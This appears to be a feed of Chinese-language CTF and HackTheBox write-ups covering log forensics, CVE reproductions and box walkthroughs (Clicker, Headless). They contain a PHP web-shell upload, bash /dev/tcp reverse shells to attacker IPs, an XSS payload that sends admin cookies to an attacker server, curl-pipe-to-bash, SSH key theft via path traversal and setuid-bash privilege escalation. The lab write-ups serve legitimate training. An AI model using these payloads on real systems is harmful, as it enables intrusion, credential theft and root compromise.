it&#x27;s a fantastic company y&#x27;all have</span><br><span class="line">        here.</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        I hope to work with you all again soon.</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        Regards,</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        Alex Poole</span><br><span class="line">    &lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>成功找到<code>&lt;form action=&quot;http://10.10.0.78/update.php&quot; method=&quot;post&quot; id=&quot;login&quot; data-focus=&quot;username&quot;</code>，说明攻击者想上传到自己的ip上，url为<code>http://10.10.0.78/update.php</code></p>
<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>承包商什么时候以管理员身份登录论坛的？</strong></p>
<p>还是查表找到<code>phpbb_log</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from phpbb_log;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Bumblebee-HackTheBox/image-20240419102440293.png"></p>
<p>可以将时间戳<code>1682506392</code>转换为标准时间，脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import pytz</span><br><span class="line"></span><br><span class="line">timestamp = 1682506392</span><br><span class="line">utc_timezone = pytz.timezone(&#x27;UTC&#x27;)</span><br><span class="line">dt = datetime.datetime.fromtimestamp(timestamp, utc_timezone)</span><br><span class="line">standard_time = dt.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line"></span><br><span class="line">print(standard_time)</span><br></pre></td></tr></table></figure>

<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>论坛里有LDAP连接的明文凭据，密码是多少？</strong></p>
<p>查询一下<code>phpbb_config</code>配置文件里的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from phpbb_config;</span><br></pre></td></tr></table></figure>

<p>找到LDAP的密码<code>Passw0rd1</code></p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419103322104.png"></p>
<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>管理员用户的用户代理是什么？</strong></p>
<p>在数据库的 <code>phpbb_log</code> 表中，寻找 <code>operation</code> 为 <code>LOG_ADMIN_AUTH_SUCCESS</code> 的记录，可以找到这两条 ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.255.254.2</span><br><span class="line">10.10.0.78</span><br></pre></td></tr></table></figure>

<p>前面已经确定承包商的 ip 为 <code>10.10.0.78</code>，那么 <code>10.255.254.2</code> 就是管理员用户的 ip，在 <code>access.log</code> 中可以找到 <code>user-agent</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log | grep &quot;10.255.254.2&quot;</span><br></pre></td></tr></table></figure>

<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>承包商什么时候将自己添加到管理员组？ （世界标准时间）</strong></p>
<p><code>phpbb_log</code>中有显示添加admin的时间戳，直接用前面脚本转换就行</p>
<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>承包商何时下载了数据库备份？</strong></p>
<p>在<code>access.log</code>筛选<code>backup</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log | grep &quot;backup&quot;</span><br></pre></td></tr></table></figure>

<p>成功找到，不过要转换一下时区为<code>26/04/2023 11:01:38</code></p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419104642901.png"></p>
<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>access.log 中所述的数据库备份的大小（以字节为单位）是多少？</strong></p>
<p>直接看响应包就行了，大小为34707</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] &quot;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&quot; 200 34707 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>日志分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-28512</title>
    <url>/article/CVE-2022-28512.html</url>
    <content><![CDATA[<p>Fantastic Blog (CMS)是一个博客&#x2F;文章网络内容管理系统。该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞</p>
<span id="more"></span>

<h1 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h1><p>打开题目</p>
<p><img src="/article/CVE-2022-28512/image-20240413231746967.png"></p>
<p>按照漏洞描述在<code>/single.php</code>路径的参数id存在sql注入漏洞，我们手动注入一下</p>
<p><img src="/article/CVE-2022-28512/image-20240413231855630.png"></p>
<p>可以发现测试成功，我们bp抓包并保存下来，然后使用sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l &quot;./requests/1.txt&quot;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l &quot;./requests/1.txt&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>

<p><img src="/article/CVE-2022-28512/image-20240413232423326.png"></p>
]]></content>
      <categories>
        <category>春秋云镜</category>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-30887</title>
    <url>/article/CVE-2022-30887.html</url>
    <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
<span id="more"></span>

<h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><p>打开题目，利用社工手段得到用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">password：mayurik</span><br></pre></td></tr></table></figure>

<p>登陆成功后找到文件上传点</p>
<p><img src="/article/CVE-2022-30887/image-20240413113616413.png"></p>
<p>不过这里的洞被修复了，然后找到我们可以修改存在的药品图片</p>
<p><img src="/article/CVE-2022-30887/image-20240413123550782.png"></p>
<p>发包即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>春秋云镜</category>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-32991</title>
    <url>/article/CVE-2022-32991.html</url>
    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
<span id="more"></span>

<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
<p>对各个页面的参数就行sqlmap扫描</p>
<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
]]></content>
      <categories>
        <category>春秋云镜</category>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>Clicker-HackTheBox</title>
    <url>/article/Clicker-HackTheBox.html</url>
    <content><![CDATA[<p>session伪造、perl_startup提权</p>
<span id="more"></span>



<h1 id="Clicker-HackTheBox"><a href="#Clicker-HackTheBox" class="headerlink" title="Clicker-HackTheBox"></a>Clicker-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.232</span><br></pre></td></tr></table></figure>

<p><img src="/article/Clicker-HackTheBox/image-20240109203146750.png"></p>
<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu)) //重定向</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br></pre></td></tr></table></figure>

<p>我们往下看发现启用了nfs协议</p>
<p><img src="/article/Clicker-HackTheBox/image-20240109230610834.png"></p>
<p>去网上查询下相关资料 <a href="https://zhuanlan.zhihu.com/p/607202498?utm_id=0">参考文章</a></p>
<blockquote>
<p>NFS最大的功能就是可以透过网络，让不同的机器、不同的操作系统、可以彼此分享个别的档案(share  files)。所以，你也可以简单地将它看做是一个文件服务器(file  server)。这个NFS服务器可以让你的PC来将网络远程的NFS服务器分享的目录，挂载到本地端的机器当中，在本地端的机器看起来，那个远程主机的目录就好像是自己的一个磁盘分区槽一样(partition)，使用上相当的便利。</p>
</blockquote>
<p>既然可以远程读取文件，那么我们使用mount命令将远程NFS文件系统挂载到本地目录</p>
<p>在本地创建目录<code>mnt/nfs_file</code>，然后读取根目录文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount -o nolock 10.10.11.232:/ ~/test/mnt/nfs_file</span><br></pre></td></tr></table></figure>

<p>注：<code>-o</code>：指定挂载选项，比如读写权限、访问权限等</p>
<p>​		<code>nolock</code> 是在挂载 NFS 文件系统时的一种选项，用于禁用文件锁定机制，使得同时进行读写操作不受文件锁定限制</p>
<p>我们ls一下，发现zip文件</p>
<p><img src="/article/Clicker-HackTheBox/image-20240109232705184.png"></p>
<p>解压发现不行，用cp命令复制到本地即可</p>
<p><img src="/article/Clicker-HackTheBox/image-20240109233234476.png"></p>
<p>由于80端口出现重定向，那么我们添加域名到<code>/etc/hosts</code></p>
<p>开始进行下一步</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>我们在admin.php注意到有对session进行身份验证，如果验证失败则重定向到index.php</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110162754718.png"></p>
<p>那么我们尝试得到admin的session，接着在save_game.php找到可利用的地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">include_once(&quot;db_utils.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&#x27;PLAYER&#x27;]) &amp;&amp; $_SESSION[&#x27;PLAYER&#x27;] != &quot;&quot;) &#123;</span><br><span class="line">	$args = [];</span><br><span class="line">	foreach($_GET as $key=&gt;$value) &#123;</span><br><span class="line">		if (strtolower($key) === &#x27;role&#x27;) &#123;</span><br><span class="line">			// prevent malicious users to modify role</span><br><span class="line">			header(&#x27;Location: /index.php?err=Malicious activity detected!&#x27;);</span><br><span class="line">			die;</span><br><span class="line">		&#125;</span><br><span class="line">		$args[$key] = $value;</span><br><span class="line">	&#125;</span><br><span class="line">	save_profile($_SESSION[&#x27;PLAYER&#x27;], $_GET);</span><br><span class="line">	// update session info</span><br><span class="line">	$_SESSION[&#x27;CLICKS&#x27;] = $_GET[&#x27;clicks&#x27;];</span><br><span class="line">	$_SESSION[&#x27;LEVEL&#x27;] = $_GET[&#x27;level&#x27;];</span><br><span class="line">	header(&#x27;Location: /index.php?msg=Game has been saved!&#x27;);	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>简单分析一下，可以通过foreach对GET参数进行遍历，如果<code>$key</code>不为role（不区分大小写），那么<code>$args[$key] = $value;</code>进行赋值，调用save_profile函数去更新session，修改成功则返回<code>Game has been saved!</code></p>
<p>这里我们搜索一下<code>$_SESSION[&#39;PLAYER&#39;]</code>是怎么来的，发现是由username决定的也就是登陆者身份</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110164127075.png"></p>
<p>那么我们可以借助GET传参<code>role=Admin</code>来更新并得到admin的session，但要绕过<code>if (strtolower($key) === &#39;role&#39;)</code>判断</p>
<p>这里本地测试发现，利用换行符<code>%0a</code>就行了</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110200952730.png"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>我们随便注册登录后点击play进入游戏，然后save的时候抓包</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110165933805.png"></p>
<p>放行，提示修改成功</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110165957356.png"></p>
<p>然后退出重新登录，发现多了一个功能</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110170626598.png"></p>
<p>点进去看看发现有四个用户</p>
<p>有个导出表格export选项，点击得到保存的路径</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110170802276.png"></p>
<p>访问一下</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110170946574.png"></p>
<p>我们抓包看看保存的过程发现拓展名可控</p>
<p>尝试修改为php成功</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110171226227.png"></p>
<p>既然可以修改为php后缀，那么我们寻找下写马的位置。很明显，保存的数据中只有nickname可以让我们写马，而如何修改nickname的值就和刚刚修改role一样的办法</p>
<p>点击play，然后save的时候抓包</p>
<p>（注意<code>?</code>要url编码一下）</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110172332221.png"></p>
<p>然后还是一样回显保存成功，那么说明成功写入马</p>
<p>继续按照刚刚那样抓包修改导出拓展名为php，然后访问保存路径成功RCE</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110172633202.png"></p>
<p>我们将反弹shell命令url编码一下，然后执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E74%2F1028%200%3E%261%22</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110172943982.png"></p>
<p>我们尝试访问<code>/home/jack</code>发现不行，接着在<code>/opt/manage</code>发现可疑文件</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110175535438.png"></p>
<p>貌似是二进制文件execute_query的使用说明</p>
<p>我们在连接的靶机开启http服务，使用wget命令下载下来该二进制文件</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110190318094.png"></p>
<p>然后丢到ida里F5反编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  size_t v4; // rbx</span><br><span class="line">  size_t v5; // rax</span><br><span class="line">  size_t v6; // rbx</span><br><span class="line">  size_t v7; // rax</span><br><span class="line">  int v8; // [rsp+10h] [rbp-B0h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-A8h]</span><br><span class="line">  char *name; // [rsp+20h] [rbp-A0h]</span><br><span class="line">  char *command; // [rsp+28h] [rbp-98h]</span><br><span class="line">  char s[32]; // [rsp+30h] [rbp-90h] BYREF</span><br><span class="line">  char src[88]; // [rsp+50h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v14; // [rsp+A8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  if ( argc &gt; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = atoi(argv[1]);</span><br><span class="line">    dest = (char *)calloc(0x14uLL, 1uLL);</span><br><span class="line">    switch ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0:</span><br><span class="line">        puts(&quot;ERROR: Invalid arguments&quot;);</span><br><span class="line">        return 2;</span><br><span class="line">      case 1:</span><br><span class="line">        strncpy(dest, &quot;create.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 2:</span><br><span class="line">        strncpy(dest, &quot;populate.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 3:</span><br><span class="line">        strncpy(dest, &quot;reset_password.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 4:</span><br><span class="line">        strncpy(dest, &quot;clean.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      default:</span><br><span class="line">        strncpy(dest, argv[2], 0x14uLL);</span><br><span class="line">LABEL_10:</span><br><span class="line">        strcpy(s, &quot;/home/jack/queries/&quot;);</span><br><span class="line">        v4 = strlen(s);</span><br><span class="line">        v5 = strlen(dest);</span><br><span class="line">        name = (char *)calloc(v4 + v5 + 1, 1uLL);</span><br><span class="line">        strcat(name, s);</span><br><span class="line">        strcat(name, dest);</span><br><span class="line">        setreuid(0x3E8u, 0x3E8u);</span><br><span class="line">        if ( access(name, 4) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;File not readable or not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          strcpy(src, &quot;/usr/bin/mysql -u clicker_db_user --password=&#x27;clicker_db_password&#x27; clicker -v &lt; &quot;);</span><br><span class="line">          v6 = strlen(src);</span><br><span class="line">          v7 = strlen(dest);</span><br><span class="line">          command = (char *)calloc(v6 + v7 + 1, 1uLL);</span><br><span class="line">          strcat(command, src);</span><br><span class="line">          strcat(command, name);</span><br><span class="line">          system(command);</span><br><span class="line">        &#125;</span><br><span class="line">        result = 0;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ERROR: not enough arguments&quot;);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就卡住了，于是参考下国外师傅写的<a href="https://medium.com/@depradip_8731/clicker-htb-writeup-walkthrough-f9bc00b57dee">wp</a>是去读取了jack的id_rsa私钥</p>
<p>这里的参数5是因为在上述代码中如果不为1234中的一个，就会执行第三个命令行参数 <code>argv[2]</code> 的内容复制到 <code>dest</code> 变量中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default:</span><br><span class="line">    strncpy(dest, argv[2], 0x14uLL);</span><br></pre></td></tr></table></figure>

<p>然后拼接文件路径，然后检查文件是否可读。如果文件不可读或者不存在，程序会输出 “File not readable or not found”。否则，将会构建一个 MySQL 命令并执行它，因为拼接的路径为<code>/home/jack/queries/</code>，所以要先返回上一级目录</p>
<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./execute_query 5 ../.ssh/id_rsa</span><br></pre></td></tr></table></figure>

<p>成功读取</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110180639183.png"></p>
<p>将这一长串保存下来命名为id_rsa</p>
<p>由于为了确保私钥的安全性，私钥文件应该只对所有者有读写权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>

<p>然后注意OpenSSH内容格式不对，所以将三个<code>-</code>修改为五个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAAB...</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>直接ssh连接，得到user的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa jack@10.10.11.232</span><br></pre></td></tr></table></figure>

<p><img src="/article/Clicker-HackTheBox/image-20240110184119487.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们sudo发现有monitor.sh，然后cat看下具体内容</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110184926380.png"></p>
<p>这里注意到两个文件<code>/usr/bin/xml_pp</code>和<code>/usr/bin/echo</code>（后者并没有什么特殊用处）</p>
<p>而我们跟进<code>/usr/bin/xml_pp</code>发现是perl脚本运行</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110185423524.png"></p>
<p>通过搜索得知一种名为perl_startup的提权方式 <a href="https://www.exploit-db.com/exploits/39702">参考文章</a></p>
<p>我们直接给monitor.sh赋予<code>/bin/bash</code>权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo PERL5OPT=-d PERL5DB=&#x27;exec &quot;chmod u+s /bin/bash&quot;&#x27; /opt/monitor.sh</span><br><span class="line">//u+s表示给user用户添加权限，即/bin/bash</span><br></pre></td></tr></table></figure>

<p>然后再<code>bash -p</code>即可（用于启用特权模式（privileged mode）的一个选项，保留有效用户的特权和权限）</p>
<p>得到root的flag</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110185919717.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Headless-HackTheBox</title>
    <url>/article/Headless-HackTheBox.html</url>
    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
<span id="more"></span>

<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
<p>使用nmap扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>

<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
<p>可以发现5000端口是开放的，继续扫一下目录</p>
<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>提交后会发现提示Hacking</p>
<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
<p>（利用fetch函数对我们服务器发送网络请求）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>

<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
<p>不过好在是拿到了admin的cookie</p>
<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
<ol>
<li><p>首先在本地创建shell.sh文件，写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后用curl命令去读取我们的shell.sh文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
</ol>
<p>成功反弹shell</p>
<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
<p>得到user的flag</p>
<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
<p>我们尝试用sudo提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
<p>我们strings命令查看下得到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p>重点看下面这段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
<ol>
<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后赋予该sh脚本的执行权限</p>
